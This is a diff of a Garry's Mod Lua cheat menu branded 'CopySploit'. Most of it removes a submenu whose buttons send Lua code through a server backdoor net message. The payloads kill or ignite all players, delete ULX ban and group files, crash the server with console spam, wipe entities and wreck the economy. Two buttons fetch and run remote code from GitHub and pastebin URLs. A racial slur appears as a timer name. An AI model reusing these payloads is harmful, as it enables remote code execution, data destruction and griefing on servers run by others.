@@ -1797,11 +1797,10 @@ net.WriteString( "RunConsoleCommand(\"ulx_logecho\", \"0\")" )
 net.WriteBit(1)
 net.SendToServer()
 end, },
-{ typ = "func", name = "bd_menu", func = function()
+{ typ = "func", name = "Макросы", func = function()
 iZNX.Menu:Remove()
 RunConsoleCommand( "bd_menu" )
 end, },
-{ typ = "htxcommandeliste", name = "Список команд" },
 { typ = "soundboard", name = "SoundBoard" },
 { typ = "players", addr = "give_superadmins" },
 { typ = "func", name = "Superadmin", func = function()
@@ -3505,687 +3504,8 @@ surface.DrawOutlinedRect( 0, 0, w, h )
 surface.SetDrawColor( Color(110, 70, 70, 255) )
 surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
 end
-TButton.DoClick = function()
-iZNX.HTXCommandeListe()
-end
 return TButton:GetWide(), TButton:GetTall()
 end
-function iZNX.HTXCommandeListe()
-if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
-iZNX.HTXCommandeSelector = vgui.Create("DFrame")
-iZNX.HTXCommandeSelector:SetSize(240,350)
-iZNX.HTXCommandeSelector:SetTitle("Макросы")
-iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
-iZNX.HTXCommandeSelector:MakePopup()
-iZNX.HTXCommandeSelector.Paint = function( s, w, h )
-if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
-surface.SetDrawColor( Color(50, 50, 90, 245) )
-surface.DrawRect( 0, 0, w, h )
-surface.SetDrawColor( Color(0, 0, 50, 245) )
-surface.DrawOutlinedRect( 0, 0, w, h )
-surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
-end
-local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
-DScrollPanel:Dock( FILL )
-local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
-commandnethtx1:SetSize( 208, 20 )
-commandnethtx1:SetPos( 2, 175 )
-commandnethtx1:SetText("Убить всех")
-commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx1.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx1.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все мертвы" )
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
-commandnethtx2:SetSize( 208, 20 )
-commandnethtx2:SetPos( 2, 100 )
-commandnethtx2:SetText("Хардбасс диско")
-commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx2.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx2.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
-net.Start(thefrenchenculer)
-net.WriteString( "http.Fetch(\"https://raw.githubusercontent.com/WERooo/somelua/master/discohardbass.lua\",function(b,l,h,c)RunString(b)end,nil)" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
-commandnethtx3:SetSize( 208, 20 )
-commandnethtx3:SetPos( 2, 375 )
-commandnethtx3:SetText("Удалить ulx баны (файл)")
-commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx3.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx3.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
-commandnethtx4:SetSize( 208, 20 )
-commandnethtx4:SetPos( 2, 725 )
-commandnethtx4:SetText("Поджечь всех")
-commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx4.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx4.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Поджигаем" )
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
-commandnethtx5:SetSize( 208, 20 )
-commandnethtx5:SetPos( 2, 150 )
-commandnethtx5:SetText("Удалить ulx группы")
-commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx5.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx5.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
-commandnethtx6:SetSize( 208, 20 )
-commandnethtx6:SetPos( 2, 50 )
-commandnethtx6:SetText("Выключить сервер")
-commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx6.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx6.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Выключаем" )
-iZNX.NetStart(thefrenchenculer)
-net.WriteString("timer.Create( \"spamlolk\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \" \") end end)")
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
-commandnethtx7:SetSize( 208, 20 )
-commandnethtx7:SetPos( 2, 200 )
-commandnethtx7:SetText("Спам в чат")
-commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx7.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-local chatrapemike = false
-commandnethtx7.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-RainbowMike = {
-"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
-"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
-"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
-"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
-"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
-"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
-}
-        chatrapemike = !chatrapemike
-        if( chatrapemike ) then
-                timer.Create( "niggaspams", 0.0001, 0, function()
-                    net.Start(thefrenchenculer)
-                    net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(RainbowMike).."]]) end " )
-                    net.WriteBit (1)
-                    net.SendToServer()
-                end )
-        else
-                timer.Destroy( "niggaspams" )
-
-
-        end
-    end
-local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
-commandnethtx8:SetSize( 208, 20 )
-commandnethtx8:SetPos( 2, 225 )
-commandnethtx8:SetText("Изменить всем модели")
-commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx8.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx8.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Изменяем" )
-iZNX.NetStart(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
-commandnethtx9:SetSize( 208, 20 )
-commandnethtx9:SetPos( 2, 250 )
-commandnethtx9:SetText("Сломать физику")
-commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx9.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx9.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сломано" )
-net.Start(thefrenchenculer)
-net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
-commandnethtx10:SetSize( 208, 20 )
-commandnethtx10:SetPos( 2, 275 )
-commandnethtx10:SetText("Обратная гравитация")
-commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx10.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx10.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бах" )
-net.Start(thefrenchenculer)
-net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
-commandnethtx11:SetSize( 208, 20 )
-commandnethtx11:SetPos( 2, 300 )
-commandnethtx11:SetText("Сбросить все деньги")
-commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx11.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx11.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сброшено" )
-net.Start(thefrenchenculer)
-net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
-commandnethtx12:SetSize( 208, 20 )
-commandnethtx12:SetPos( 2, 325 )
-commandnethtx12:SetText("Запустить всех в воздух")
-commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx12.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx12.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Ухуу" )
-net.Start(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
-commandnethtx13:SetSize( 208, 20 )
-commandnethtx13:SetPos( 2, 350 )
-commandnethtx13:SetText("Изменить всем имена")
-commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx13.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx13.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Изменено" )
-net.Start(thefrenchenculer)
-net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Hacked by CopySploit\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
-commandnethtx15:SetSize( 208, 20 )
-commandnethtx15:SetPos( 2, 400 )
-commandnethtx15:SetText("Сломать Экономику")
-commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx15.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx15.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Сломано" )
-net.Start(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx16 = vgui.Create("DButton", DScrollPanel)
-commandnethtx16:SetSize( 208, 20 )
-commandnethtx16:SetPos( 2, 425 )
-commandnethtx16:SetText("Порно звуки шагов")
-commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx16.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx16.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Ах" )
-net.Start(thefrenchenculer)
-net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
-commandnethtx17:SetSize( 208, 20 )
-commandnethtx17:SetPos( 2, 450 )
-commandnethtx17:SetText("☢ Удалить все энтити ☢")
-commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx17.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx17.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Удалено" )
-net.Start(thefrenchenculer)
-net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx18 = vgui.Create("DButton", DScrollPanel)
-commandnethtx18:SetSize( 208, 20 )
-commandnethtx18:SetPos( 2, 475 )
-commandnethtx18:SetText("Хуйня ебаная рот ебал")
-commandnethtx18:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx18.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx18.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
-net.Start(thefrenchenculer)
-net.WriteString( "http.Fetch(\"https://pastebin.com/raw/LH4NW5yc\",RunString)" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx19 = vgui.Create("DButton", DScrollPanel)
-commandnethtx19:SetSize( 208, 20 )
-commandnethtx19:SetPos( 2, 500 )
-commandnethtx19:SetText("-Уши у всех игроков")
-commandnethtx19:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx19.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx19.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "-уши" )
-net.Start(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx20 = vgui.Create("DButton", DScrollPanel)
-commandnethtx20:SetSize( 208, 20 )
-commandnethtx20:SetPos( 2, 525 )
-commandnethtx20:SetText("Землетрясение")
-commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx20.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx20.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
-net.Start(thefrenchenculer)
-net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx21 = vgui.Create("DButton", DScrollPanel)
-commandnethtx21:SetSize( 208, 20 )
-commandnethtx21:SetPos( 2, 550 )
-commandnethtx21:SetText("2D модели")
-commandnethtx21:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx21.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx21.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бах" )
-net.Start(thefrenchenculer)
-net.WriteString([[
-    for k,v in pairs(player.GetAll()) do
-    local a = v:LookupBone("ValveBiped.Bip01_Head1")
-    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
-    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
-    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
-    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
-    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
-    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
-    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
-    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
-    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
-    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
-
-        v:ManipulateBoneScale( a, Vector(4,0,4))
-        v:ManipulateBoneScale( b, Vector(0,0,0))
-        v:ManipulateBoneScale( c, Vector(0,0,0))
-        v:ManipulateBoneScale( d, Vector(0,0,1))
-        v:ManipulateBoneScale( e, Vector(0,0,1))
-        v:ManipulateBoneScale( f, Vector(0,0,0))
-        v:ManipulateBoneScale( g, Vector(0,0,0))
-        v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
-        v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
-        v:ManipulateBoneScale( j, Vector(0,0,0))
-        v:ManipulateBoneScale( k, Vector(0,0,0))
-        end]])
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx22 = vgui.Create("DButton", DScrollPanel)
-commandnethtx22:SetSize( 208, 20 )
-commandnethtx22:SetPos( 2, 575 )
-commandnethtx22:SetText("Армагеддон")
-commandnethtx22:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx22.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx22.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
-local armageddon = [[
-            hook.Add("Think", "armageddon", function()
-                local explode = ents.Create( "env_explosion" )
-                    explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
-                    explode:Spawn()
-                    explode:SetKeyValue( "iMagnitude", "500" )
-                    explode:Fire( "Explode", 0, 0 )
-                end)
-]]
-net.Start(thefrenchenculer)
-net.WriteString( armageddon )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx23 = vgui.Create("DButton", DScrollPanel)
-commandnethtx23:SetSize( 208, 20 )
-commandnethtx23:SetPos( 2, 600 )
-commandnethtx23:SetText("Сделать всех гигантами")
-commandnethtx23:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx23.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx23.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
-local giant = [[
-hook.Add("Think", "giant", function()
-    for k,v in pairs (player.GetAll()) do
-        v:SetModelScale(2.5, 100);
-        v:SetRunSpeed(400 * 2);
-        v:SetWalkSpeed(200 * 2);
-    end
-end)]]
-net.Start(thefrenchenculer)
-net.WriteString( giant )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx24 = vgui.Create("DButton", DScrollPanel)
-commandnethtx24:SetSize( 208, 20 )
-commandnethtx24:SetPos( 2, 625 )
-commandnethtx24:SetText("Сделать всех высокими")
-commandnethtx24:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx24.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx24.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
-local tall = [[
-hook.Add("Think", "tall", function()
-    for k,v in pairs (player.GetAll()) do
-        v:SetModelScale(0.2, 80);
-        v:SetRunSpeed(400 * 2);
-        v:SetWalkSpeed(200 * 2);
-    end
-end)]]
-net.Start(thefrenchenculer)
-net.WriteString( tall )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx25 = vgui.Create("DButton", DScrollPanel)
-commandnethtx25:SetSize( 208, 20 )
-commandnethtx25:SetPos( 2, 650 )
-commandnethtx25:SetText("SpeedHack")
-commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx25.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx25.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запускаем" )
-local speedhack = [[
-hook.Add("Think", "speedhack", function()
-    for k,v in pairs (player.GetAll()) do
-        v:SetRunSpeed(400* 4);
-        v:SetWalkSpeed(200 * 2);
-    end
-end)]]
-net.Start(thefrenchenculer)
-net.WriteString( speedhack )
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx26 = vgui.Create("DButton", DScrollPanel)
-commandnethtx26:SetSize( 208, 20 )
-commandnethtx26:SetPos( 2, 675 )
-commandnethtx26:SetText("Кашель всевышнего")
-commandnethtx26:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx26.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx26.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Кхм" )
-net.Start(thefrenchenculer)
-net.WriteString([[
-for k,v in pairs(player.GetAll()) do
-    timer.Create("cough", 10, 0, function()
-        RunConsoleCommand("say", "*кхм..кхм*")
-        v:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)
-        util.ScreenShake( Vector( 0, 0, 0 ), 1000, 1000, 1, 5000 )
-    end)
-end
-]])
-net.WriteBit(1)
-net.SendToServer()
-end
-local commandnethtx27 = vgui.Create("DButton", DScrollPanel)
-commandnethtx27:SetSize( 208, 20 )
-commandnethtx27:SetPos( 2, 700 )
-commandnethtx27:SetText("Azis - Hop на весь экран")
-commandnethtx27:SetTextColor(Color(255, 255, 255, 255))
-commandnethtx27.Paint = function(panel, w, h)
-surface.SetDrawColor(100, 100, 100 ,255)
-surface.DrawOutlinedRect(0, 0, w, h)
-surface.SetDrawColor(0, 0, 50 ,155)
-surface.DrawRect(0, 0, w, h)
-end
-commandnethtx27.DoClick = function()
-surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Запущено" )
-net.Start(thefrenchenculer)
